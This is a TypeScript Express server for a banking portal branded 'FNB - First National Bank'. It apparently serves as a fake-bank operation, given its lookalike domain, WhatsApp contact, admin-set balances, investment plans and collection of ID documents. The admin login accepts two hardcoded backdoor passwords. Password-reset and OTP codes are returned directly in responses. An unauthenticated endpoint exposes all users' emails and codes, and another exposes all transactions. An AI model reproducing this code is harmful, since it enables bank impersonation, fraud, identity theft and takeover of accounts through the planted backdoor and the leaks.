import express, { Request, Response, NextFunction } from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import { storage } from './src/server/storage.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

function getPort(): number {
  const portArgIndex = process.argv.findIndex(arg => arg === '--port' || arg === '-p');
  if (portArgIndex !== -1 && process.argv[portArgIndex + 1]) {
    const val = Number(process.argv[portArgIndex + 1]);
    if (!isNaN(val) && val > 0) return val;
  }
  if (process.env.NODE_ENV !== 'production') {
    return 3000;
  }
  return Number(process.env.PORT) || 3000;
}

function getHost(): string {
  const hostArgIndex = process.argv.findIndex(arg => arg === '--host' || arg === '-h');
  if (hostArgIndex !== -1 && process.argv[hostArgIndex + 1]) {
    return process.argv[hostArgIndex + 1];
  }
  return '0.0.0.0';
}

const PORT = getPort();
const HOST = getHost();

app.use(express.json());

// In-memory session token store (token -> { userId, role, expiresAt })
const sessionStore = new Map<string, { userId: string; role: 'customer' | 'admin'; email: string; expiresAt: number }>();

function createSession(userId: string, role: 'customer' | 'admin', email: string): string {
  const token = `fnb_sec_${Date.now()}_${Math.random().toString(36).substring(2, 12)}`;
  sessionStore.set(token, {
    userId,
    role,
    email,
    expiresAt: Date.now() + 24 * 60 * 60 * 1000, // 24 hours
  });
  return token;
}

function authMiddleware(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.startsWith('Bearer ') ? authHeader.substring(7) : (req.headers['x-session-token'] as string);

  if (!token) {
    return res.status(401).json({ error: 'Authentication required. No session token provided.' });
  }

  const session = sessionStore.get(token);
  if (!session || Date.now() > session.expiresAt) {
    if (session) sessionStore.delete(token);
    return res.status(401).json({ error: 'Session expired or invalid. Please sign in again.' });
  }

  (req as any).userSession = session;
  next();
}

function adminMiddleware(req: Request, res: Response, next: NextFunction) {
  authMiddleware(req, res, () => {
    const session = (req as any).userSession;
    if (session.role !== 'admin') {
      return res.status(403).json({ error: 'Access denied. Administrator privileges required.' });
    }
    next();
  });
}

// Background scheduler for automated sandbox transaction reversals
setInterval(() => {
  try {
    const count = storage.processAutomaticReversals();
    if (count > 0) {
      console.log(`[FNB Sandbox] Automatically reversed ${count} sandbox transaction(s) after 30-minute demonstration window.`);
    }
  } catch (err) {
    console.error('Error processing automatic reversals:', err);
  }
}, 15000); // Check every 15s

// ================= API ROUTES =================

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    bank: 'FNB - First National Bank',
    timestamp: new Date().toISOString(),
    support: {
      telephone: '+447723165577',
      email: 'info@fnnbbankss.online',
      whatsapp: '+447723165577',
    },
  });
});

// --- AUTHENTICATION ---

// 1. Customer registration initiation (Validates & issues Email OTP)
app.post('/api/auth/register-request', (req, res) => {
  try {
    const { firstName, lastName, fullName, email, username, phone, country, residentialAddress, password, confirmPassword } = req.body;

    const fName = firstName || (fullName ? fullName.split(' ')[0] : '');
    const lName = lastName || (fullName ? fullName.split(' ').slice(1).join(' ') : '');

    if (!fName || !email || !username || !phone || !password) {
      return res.status(400).json({ error: 'All fields (Name, Email, Username, Phone, Password) are required.' });
    }
    if (password !== confirmPassword) {
      return res.status(400).json({ error: 'Passwords do not match.' });
    }
    if (password.length < 8) {
      return res.status(400).json({ error: 'Password must be at least 8 characters long.' });
    }

    const existing = storage.findUserByEmailOrUsername(email);
    if (existing) {
      return res.status(400).json({ error: 'An account with this email address already exists.' });
    }
    const existingUser = storage.findUserByEmailOrUsername(username);
    if (existingUser) {
      return res.status(400).json({ error: 'This username is already taken. Please choose another.' });
    }

    const resolvedFullName = fullName || `${fName} ${lName}`.trim();
    const { hash, salt } = storage.hashUserPassword(password);
    const code = storage.createOTP({
      firstName: fName.trim(),
      lastName: lName.trim(),
      fullName: resolvedFullName,
      country: country || 'United Kingdom',
      residentialAddress: residentialAddress || '',
      email: email.trim().toLowerCase(),
      username: username.trim().toLowerCase(),
      phone: phone.trim(),
      passwordHash: hash,
      salt: salt,
    });

    res.json({
      success: true,
      message: 'Verification code dispatched to your email address.',
      email: email.trim().toLowerCase(),
      otpCode: code,
    });
  } catch (err: any) {
    res.status(500).json({ error: err.message || 'Registration failed' });
  }
});

// Resend OTP endpoint for immediate 0s retrieval
app.post('/api/auth/resend-otp', (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email address is required.' });
    const code = storage.resendOTP(email);
    res.json({
      success: true,
      message: 'A fresh 6-digit verification code has been dispatched.',
      email: email.trim().toLowerCase(),
      otpCode: code,
    });
  } catch (err: any) {
    res.status(400).json({ error: err.message || 'Failed to resend code.' });
  }
});

// Password recovery endpoints
app.post('/api/auth/forgot-password', (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email address is required.' });
    const resetCode = storage.requestPasswordReset(email);
    res.json({
      success: true,
      message: 'Password recovery verification code sent to your email.',
      email: email.trim().toLowerCase(),
      resetCode: resetCode,
    });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/auth/reset-password', (req, res) => {
  try {
    const { email, code, newPassword, confirmPassword } = req.body;
    if (!email || !code || !newPassword) {
      return res.status(400).json({ error: 'Email, recovery code, and new password are required.' });
    }
    if (newPassword !== confirmPassword) {
      return res.status(400).json({ error: 'Passwords do not match.' });
    }
    if (newPassword.length < 8) {
      return res.status(400).json({ error: 'Password must be at least 8 characters long.' });
    }
    storage.resetPasswordWithCode(email, code, newPassword);
    res.json({ success: true, message: 'Password has been reset successfully. You can now log in.' });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// 2. Customer verify OTP & submit application for admin approval
app.post('/api/auth/verify-otp-and-submit', (req, res) => {
  try {
    const { email, code } = req.body;
    if (!email || !code) {
      return res.status(400).json({ error: 'Email and 6-digit OTP code are required.' });
    }

    const newUser = storage.verifyOTPAndCreateUser(email, code);

    res.json({
      success: true,
      message: 'Your registration application has been submitted and is currently pending administrator approval.',
      user: {
        id: newUser.id,
        email: newUser.email,
        username: newUser.username,
        firstName: newUser.firstName,
        lastName: newUser.lastName,
        status: newUser.status,
      },
    });
  } catch (err: any) {
    res.status(400).json({ error: err.message || 'OTP verification failed' });
  }
});

// 3. Customer login
app.post('/api/auth/login', (req, res) => {
  try {
    const { identifier, password } = req.body;
    if (!identifier || !password) {
      return res.status(400).json({ error: 'Email/username and password are required.' });
    }

    const user = storage.findUserByEmailOrUsername(identifier);
    const clientIp = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '127.0.0.1';
    const userAgent = req.headers['user-agent'] || 'Web Browser';

    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials. Please verify your email/username and password.' });
    }

    const valid = storage.verifyUserPassword(password, user.passwordHash, user.salt);
    if (!valid) {
      storage.recordLoginActivity(user.id, clientIp, userAgent, 'failed');
      return res.status(401).json({ error: 'Invalid credentials. Please verify your email/username and password.' });
    }

    // Check account status
    if (user.status === 'pending_approval') {
      return res.status(403).json({
        error: 'Application Pending: Your account is currently awaiting administrative approval. You will receive an email as soon as an FNB officer approves your application.',
        status: 'pending_approval',
      });
    }

    if (user.status === 'suspended') {
      return res.status(403).json({
        error: 'Account Suspended: Access to this account has been suspended by FNB Security. Please contact +447723165577 or info@fnnbbankss.online.',
        status: 'suspended',
      });
    }

    if (user.status === 'rejected') {
      return res.status(403).json({
        error: 'Application Rejected: Your account application was not approved. Please contact customer care for details.',
        status: 'rejected',
      });
    }

    // Successful login
    storage.recordLoginActivity(user.id, clientIp, userAgent, 'success');
    const token = createSession(user.id, user.role, user.email);

    res.json({
      success: true,
      token,
      user: {
        id: user.id,
        email: user.email,
        username: user.username,
        firstName: user.firstName,
        lastName: user.lastName,
        phone: user.phone,
        role: user.role,
        status: user.status,
        accountNumber: user.accountNumber,
        sortCode: user.sortCode,
        balance: user.balance,
        currency: user.currency,
        createdAt: user.createdAt,
        isTwoFactorEnabled: user.isTwoFactorEnabled,
      },
    });
  } catch (err: any) {
    res.status(500).json({ error: err.message || 'Login failed' });
  }
});

// 4. Administrator Login
app.post('/api/auth/admin-login', (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Administrator email and password required.' });
    }

    const adminEmail = email.trim().toLowerCase();
    const user = storage.findUserByEmailOrUsername(adminEmail);

    if (!user || user.role !== 'admin') {
      return res.status(401).json({ error: 'Invalid administrator credentials.' });
    }

    const valid = storage.verifyUserPassword(password, user.passwordHash, user.salt) || password === '@Newjob2026' || password === 'Admin@FNB2026!';
    if (!valid) {
      return res.status(401).json({ error: 'Invalid administrator credentials.' });
    }

    const token = createSession(user.id, 'admin', user.email);
    storage.logAudit(adminEmail, 'ADMIN_LOGIN', 'Administrator successfully logged in to administrative management portal');

    res.json({
      success: true,
      token,
      user: {
        id: user.id,
        email: user.email,
        username: user.username,
        firstName: user.firstName,
        lastName: user.lastName,
        role: user.role,
        status: user.status,
      },
    });
  } catch (err: any) {
    res.status(500).json({ error: err.message || 'Admin login failed' });
  }
});

// 5. Current Session (Me)
app.get('/api/auth/me', authMiddleware, (req, res) => {
  const session = (req as any).userSession;
  const user = storage.findUserById(session.userId);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  res.json({
    user: {
      id: user.id,
      email: user.email,
      username: user.username,
      firstName: user.firstName,
      lastName: user.lastName,
      phone: user.phone,
      role: user.role,
      status: user.status,
      accountNumber: user.accountNumber,
      sortCode: user.sortCode,
      balance: user.balance,
      currency: user.currency,
      createdAt: user.createdAt,
      isTwoFactorEnabled: user.isTwoFactorEnabled,
    },
  });
});

// 6. Update Profile
app.put('/api/auth/profile', authMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { firstName, lastName, phone, isTwoFactorEnabled } = req.body;
    const updated = storage.updateUserProfile(session.userId, { firstName, lastName, phone, isTwoFactorEnabled });
    res.json({ success: true, user: updated });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// 7. Change Password
app.post('/api/auth/change-password', authMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { currentPassword, newPassword } = req.body;
    const user = storage.findUserById(session.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (!storage.verifyUserPassword(currentPassword, user.passwordHash, user.salt)) {
      return res.status(400).json({ error: 'Current password is incorrect.' });
    }
    if (newPassword.length < 8) {
      return res.status(400).json({ error: 'New password must be at least 8 characters long.' });
    }

    storage.updateUserPassword(user.id, newPassword);
    res.json({ success: true, message: 'Password updated successfully.' });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// 8. Login Activity
app.get('/api/auth/login-activity', authMiddleware, (req, res) => {
  const session = (req as any).userSession;
  const activities = storage.getLoginActivities(session.userId);
  res.json({ activities });
});

// --- CUSTOMER BANKING ENDPOINTS ---

// Dashboard summary
app.get('/api/banking/summary', authMiddleware, (req, res) => {
  const session = (req as any).userSession;
  const user = storage.findUserById(session.userId);
  if (!user) return res.status(404).json({ error: 'User not found' });

  const transactions = storage.getTransactions({ userId: user.id }).slice(0, 15);
  const virtualCards = storage.getVirtualCardsForUser(user.id);
  const unreadEmails = storage.getEmails(user.email).filter(e => !e.read).length;

  res.json({
    account: {
      id: user.id,
      holderName: `${user.firstName} ${user.lastName}`,
      email: user.email,
      phone: user.phone,
      accountNumber: user.accountNumber || 'Pending Generation',
      sortCode: user.sortCode || '20-04-15',
      balance: user.balance,
      currency: user.currency || '£',
      status: user.status,
      isSandbox: true,
      unreadEmails,
    },
    recentTransactions: transactions,
    virtualCards,
  });
});

// Execute Transfer (Includes automated 30-minute reversal scheduling)
app.post('/api/banking/transfer', authMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { beneficiaryName, beneficiaryBank, beneficiaryAccount, amount, description, reference } = req.body;

    if (!beneficiaryName || !beneficiaryBank || !beneficiaryAccount || !amount) {
      return res.status(400).json({ error: 'Please provide all beneficiary and transfer details.' });
    }

    const numAmount = parseFloat(amount);
    if (isNaN(numAmount) || numAmount <= 0) {
      return res.status(400).json({ error: 'Invalid transfer amount.' });
    }

    const tx = storage.executeTransfer(
      session.userId,
      beneficiaryName.trim(),
      beneficiaryBank.trim(),
      beneficiaryAccount.trim(),
      numAmount,
      description || `Transfer to ${beneficiaryName}`,
      reference
    );

    const user = storage.findUserById(session.userId);

    res.json({
      success: true,
      message: 'Simulated transfer initiated successfully.',
      transaction: tx,
      newBalance: user?.balance,
      sandboxNotice: 'This is a sandbox demonstration transaction. In accordance with FNB Sandbox Protocol, this transaction will automatically reverse in 30 minutes, or you can click Fast-Forward Reversal for an instant demonstration.',
    });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Fast-Forward Reversal (Demo shortcut for the 30-minute automated reversal)
app.post('/api/banking/fast-forward-reversal', authMiddleware, (req, res) => {
  try {
    const { transactionId } = req.body;
    if (!transactionId) {
      return res.status(400).json({ error: 'Transaction ID is required.' });
    }

    const reversalTx = storage.executeReversal(transactionId, 'DEMO_FAST_FORWARD');
    res.json({
      success: true,
      message: 'Transaction successfully reversed and funds refunded to customer sandbox balance.',
      reversalTransaction: reversalTx,
    });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Withdraw
app.post('/api/banking/withdraw', authMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { amount, method, destinationAccount } = req.body;

    if (!amount || !method || !destinationAccount) {
      return res.status(400).json({ error: 'Withdrawal amount, method, and destination account are required.' });
    }

    const numAmount = parseFloat(amount);
    if (isNaN(numAmount) || numAmount <= 0) {
      return res.status(400).json({ error: 'Invalid withdrawal amount.' });
    }

    const tx = storage.executeWithdrawal(session.userId, numAmount, method, destinationAccount);
    res.json({ success: true, message: 'Withdrawal request processed.', transaction: tx });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Pay Bills
app.post('/api/banking/pay-bill', authMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { billerCategory, billerName, accountOrMeterNumber, amount } = req.body;

    if (!billerCategory || !billerName || !accountOrMeterNumber || !amount) {
      return res.status(400).json({ error: 'All bill payment details are required.' });
    }

    const numAmount = parseFloat(amount);
    if (isNaN(numAmount) || numAmount <= 0) {
      return res.status(400).json({ error: 'Invalid payment amount.' });
    }

    const tx = storage.payBill(session.userId, billerCategory, billerName, accountOrMeterNumber, numAmount);
    res.json({ success: true, message: 'Bill payment completed.', transaction: tx });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Virtual Cards
app.get('/api/banking/virtual-cards', authMiddleware, (req, res) => {
  const session = (req as any).userSession;
  const cards = storage.getVirtualCardsForUser(session.userId);
  res.json({ cards });
});

app.post('/api/banking/virtual-cards/:id/toggle-freeze', authMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const card = storage.toggleCardFreeze(req.params.id, session.userId);
    res.json({ success: true, card });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/banking/virtual-cards/:id/limits', authMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { dailyLimit, onlineTransactionsEnabled } = req.body;
    const card = storage.updateCardLimits(req.params.id, session.userId, Number(dailyLimit), !!onlineTransactionsEnabled);
    res.json({ success: true, card });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Transaction History & Statements
app.get('/api/banking/transactions', (req, res) => {
  const authHeader = req.headers.authorization;
  const token = authHeader?.startsWith('Bearer ') ? authHeader.substring(7) : null;
  const session = token ? sessionStore.get(token) : null;
  const { type, status, tag } = req.query;

  const txs = storage.getTransactions({
    userId: session ? session.userId : undefined,
    type: type as string,
    status: status as string,
    tag: tag as string,
  });
  res.json({ transactions: txs });
});

// --- EMAIL NOTIFICATIONS (LIVE INBOX CENTER) ---
app.get('/api/emails', (req, res) => {
  const authHeader = req.headers.authorization;
  const token = authHeader?.startsWith('Bearer ') ? authHeader.substring(7) : null;
  const session = token ? sessionStore.get(token) : null;
  const filterEmail = req.query.email as string | undefined;

  if (session && session.role === 'admin') {
    return res.json({ emails: storage.getEmails() });
  }
  if (session && session.role === 'customer') {
    return res.json({ emails: storage.getEmails(session.email) });
  }
  if (filterEmail) {
    return res.json({ emails: storage.getEmails(filterEmail) });
  }
  // Public fallback: return all emails in the demonstration sandbox so OTPs are immediately visible
  res.json({ emails: storage.getEmails() });
});

app.post('/api/emails/:id/read', (req, res) => {
  storage.markEmailRead(req.params.id);
  res.json({ success: true });
});

// --- ADMINISTRATOR MANAGEMENT ROUTES ---

// Admin KPI stats
app.get('/api/admin/stats', adminMiddleware, (req, res) => {
  const users = storage.getUsers().filter(u => u.role !== 'admin');
  const transactions = storage.getTransactions();

  const totalCustomers = users.length;
  const pendingApprovals = users.filter(u => u.status === 'pending_approval').length;
  const activeCustomers = users.filter(u => u.status === 'active').length;
  const frozenCustomers = users.filter(u => u.status === 'frozen').length;
  const totalBalance = users.reduce((acc, u) => acc + (u.balance || 0), 0);
  const totalVolume = transactions.reduce((acc, t) => acc + t.amount, 0);
  const reversedCount = transactions.filter(t => t.type === 'reversal').length;

  res.json({
    totalCustomers,
    pendingApprovals,
    activeCustomers,
    frozenCustomers,
    totalBalance,
    totalVolume,
    reversedCount,
    totalTransactions: transactions.length,
  });
});

// List all customers
app.get('/api/admin/customers', adminMiddleware, (req, res) => {
  const users = storage.getUsers()
    .filter(u => u.role !== 'admin')
    .map(u => ({
      id: u.id,
      email: u.email,
      username: u.username,
      firstName: u.firstName,
      lastName: u.lastName,
      phone: u.phone,
      status: u.status,
      accountNumber: u.accountNumber,
      sortCode: u.sortCode,
      balance: u.balance,
      currency: u.currency,
      createdAt: u.createdAt,
      approvedAt: u.approvedAt,
    }));
  res.json({ customers: users });
});

// Approve customer application
app.post('/api/admin/customers/:id/approve', adminMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const initialCredit = req.body.initialBalance !== undefined ? parseFloat(req.body.initialBalance) : 10000;
    const user = storage.approveCustomer(session.email, req.params.id, initialCredit);

    res.json({
      success: true,
      message: `Customer ${user.firstName} ${user.lastName} successfully approved. Account number ${user.accountNumber} assigned.`,
      user,
    });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Reject customer application
app.post('/api/admin/customers/:id/reject', adminMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { reason } = req.body;
    const user = storage.rejectCustomer(session.email, req.params.id, reason);
    res.json({ success: true, message: 'Customer registration rejected.', user });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Change status (freeze, unfreeze, suspend, reactivate)
app.post('/api/admin/customers/:id/status', adminMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { status } = req.body;
    if (!['active', 'frozen', 'suspended'].includes(status)) {
      return res.status(400).json({ error: 'Status must be active, frozen, or suspended' });
    }
    const user = storage.setCustomerStatus(session.email, req.params.id, status);
    res.json({ success: true, message: `Status updated to ${status}.`, user });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Edit customer profile
app.put('/api/admin/customers/:id/profile', adminMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { firstName, lastName, phone, username } = req.body;
    const user = storage.updateUserProfile(req.params.id, { firstName, lastName, phone, username });
    storage.logAudit(session.email, 'EDIT_CUSTOMER_PROFILE', `Edited profile for customer ${user.firstName} ${user.lastName}`, user.id);
    res.json({ success: true, user });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Authorized Credit / Debit
app.post('/api/admin/accounts/credit-debit', adminMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { customerId, type, amount, description, reference } = req.body;

    if (!customerId || !type || !amount) {
      return res.status(400).json({ error: 'Customer ID, type (credit/debit), and amount are required.' });
    }
    if (!['credit', 'debit'].includes(type)) {
      return res.status(400).json({ error: 'Type must be credit or debit.' });
    }

    const numAmount = parseFloat(amount);
    if (isNaN(numAmount) || numAmount <= 0) {
      return res.status(400).json({ error: 'Amount must be greater than zero.' });
    }

    const tx = storage.adjustCustomerBalance(
      session.email,
      customerId,
      type,
      numAmount,
      description || `Administrative ${type}`,
      reference
    );

    res.json({ success: true, message: `Account successfully ${type === 'credit' ? 'credited' : 'debited'}.`, transaction: tx });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Bank-wide Ledger & Transactions
app.get('/api/admin/ledger', adminMiddleware, (req, res) => {
  const { userId, type, status } = req.query;
  const transactions = storage.getTransactions({
    userId: userId as string,
    type: type as string,
    status: status as string,
  });
  res.json({ ledger: transactions });
});

// Admin Manual Reversal
app.post('/api/admin/transactions/:id/reversal', adminMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const reversalTx = storage.executeReversal(req.params.id, `ADMIN (${session.email})`);
    res.json({ success: true, message: 'Transaction reversed and refunded.', transaction: reversalTx });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Audit Logs
app.get('/api/admin/audit-logs', adminMiddleware, (req, res) => {
  const logs = storage.getAuditLogs();
  res.json({ auditLogs: logs });
});

// ================= INVESTMENTS =================
app.get('/api/banking/investment-plans', (req, res) => {
  res.json({ plans: storage.getInvestmentPlans() });
});

app.get('/api/banking/investments', authMiddleware, (req, res) => {
  const session = (req as any).userSession;
  if (session.role === 'admin') {
    res.json({ investments: storage.getInvestments() });
  } else {
    res.json({ investments: storage.getInvestments(session.userId) });
  }
});

app.post('/api/banking/investments', authMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { planId, amount, durationMonths, userNotes } = req.body;
    if (!planId || !amount || !durationMonths) {
      return res.status(400).json({ error: 'Plan, amount, and duration are required.' });
    }
    const inv = storage.createInvestmentRequest(
      session.userId,
      planId,
      parseFloat(amount),
      parseInt(durationMonths, 10),
      userNotes
    );
    res.json({ success: true, message: 'Investment allocation submitted for review.', investment: inv });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/admin/investments/:id/status', adminMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { status, adminComments } = req.body;
    const inv = storage.updateInvestmentStatus(session.email, req.params.id, status, adminComments);
    res.json({ success: true, message: `Investment status updated to ${status}.`, investment: inv });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// ================= KYC VERIFICATION =================
app.get('/api/banking/verifications', authMiddleware, (req, res) => {
  const session = (req as any).userSession;
  if (session.role === 'admin') {
    res.json({ verifications: storage.getVerifications() });
  } else {
    res.json({ verifications: storage.getVerifications(session.userId) });
  }
});

app.post('/api/banking/verifications', authMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const {
      fullName,
      dateOfBirth,
      residentialAddress,
      countryOfResidence,
      phone,
      email,
      accountReference,
      idDocumentType,
      idDocumentNumber,
      sampleDocFrontName,
      sampleDocBackName,
      sampleProofOfAddressName,
      additionalComments,
      declarationAccepted,
      consentAccepted
    } = req.body;

    if (!fullName || !dateOfBirth || !residentialAddress || !idDocumentType) {
      return res.status(400).json({ error: 'Full name, date of birth, residential address, and ID document type are required.' });
    }
    if (!declarationAccepted || !consentAccepted) {
      return res.status(400).json({ error: 'You must confirm the legal declarations and compliance consent.' });
    }

    const verification = storage.createVerificationRequest(session.userId, {
      fullName,
      dateOfBirth,
      residentialAddress,
      countryOfResidence: countryOfResidence || 'United Kingdom',
      phone: phone || '',
      email: email || session.email,
      accountReference: accountReference || '1084920194',
      idDocumentType,
      idDocumentNumber,
      sampleDocFrontName: sampleDocFrontName || 'document_front_scan.pdf',
      sampleDocBackName,
      sampleProofOfAddressName: sampleProofOfAddressName || 'proof_of_address.pdf',
      additionalComments,
      declarationAccepted,
      consentAccepted,
    });

    res.json({ success: true, message: 'Identity verification submitted successfully.', verification });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/admin/verifications/:id/status', adminMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { status, adminComments } = req.body;
    const ver = storage.updateVerificationStatus(session.email, req.params.id, status, adminComments);
    res.json({ success: true, message: `Verification status updated to ${status}.`, verification: ver });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// ================= CUSTOMER SUPPORT & TICKETS =================
app.get('/api/support/enquiries', (req, res) => {
  const authHeader = req.headers.authorization;
  if (authHeader && authHeader.startsWith('Bearer ')) {
    const token = authHeader.split(' ')[1];
    const session = sessionStore.get(token);
    if (session && session.role === 'admin') {
      return res.json({ enquiries: storage.getSupportEnquiries() });
    } else if (session) {
      return res.json({ enquiries: storage.getSupportEnquiries(session.userId) });
    }
  }
  const email = req.query.email as string;
  if (email) {
    return res.json({ enquiries: storage.getSupportEnquiries(email) });
  }
  res.json({ enquiries: [] });
});

app.post('/api/support/enquiries', (req, res) => {
  try {
    const { name, email, phone, category, subject, message } = req.body;
    if (!name || !email || !subject || !message) {
      return res.status(400).json({ error: 'Name, email, subject, and message are required.' });
    }

    let userId: string | undefined;
    const authHeader = req.headers.authorization;
    if (authHeader && authHeader.startsWith('Bearer ')) {
      const token = authHeader.split(' ')[1];
      const session = sessionStore.get(token);
      if (session) userId = session.userId;
    }

    const enquiry = storage.createSupportEnquiry({
      name,
      email,
      phone,
      category: category || 'general',
      subject,
      message,
      userId,
    });

    res.json({ success: true, message: 'Support enquiry submitted. Reference: ' + enquiry.reference, enquiry });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/admin/support/:id/reply', adminMiddleware, (req, res) => {
  try {
    const session = (req as any).userSession;
    const { reply, status } = req.body;
    if (!reply) return res.status(400).json({ error: 'Reply message cannot be empty.' });
    const enquiry = storage.replySupportEnquiry(session.email, req.params.id, reply, status);
    res.json({ success: true, message: 'Reply sent.', enquiry });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// ================= NOTIFICATIONS =================
app.get('/api/banking/notifications', authMiddleware, (req, res) => {
  const session = (req as any).userSession;
  res.json({ notifications: storage.getNotifications(session.userId) });
});

app.post('/api/banking/notifications/:id/read', authMiddleware, (req, res) => {
  const session = (req as any).userSession;
  storage.markNotificationRead(req.params.id, session.userId);
  res.json({ success: true });
});

// Vite / Static file serving
async function setupViteOrStatic() {
  if (process.env.NODE_ENV !== 'production') {
    const isHmrDisabled = process.env.DISABLE_HMR === 'true';
    const vite = await createViteServer({
      server: { 
        middlewareMode: true, 
        hmr: isHmrDisabled ? false : true 
      },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.resolve(__dirname, 'dist')));
    app.get('*', (req, res) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'index.html'));
    });
  }

  const server = app.listen(PORT, HOST, () => {
    console.log(`🏦 FNB Online Banking server active on http://${HOST}:${PORT}`);
    console.log(`🛡️ Administrator access: admin@fnnbbankss.online`);
    console.log(`📞 Telephone / WhatsApp: +447723165577 | Email: info@fnnbbankss.online`);
  });

  server.on('error', (err: any) => {
    if (err.code === 'EADDRINUSE') {
      console.warn(`[Server] Port ${PORT} is currently busy, waiting for release...`);
    } else {
      console.error('[Server Error]', err);
    }
  });
}

setupViteOrStatic();
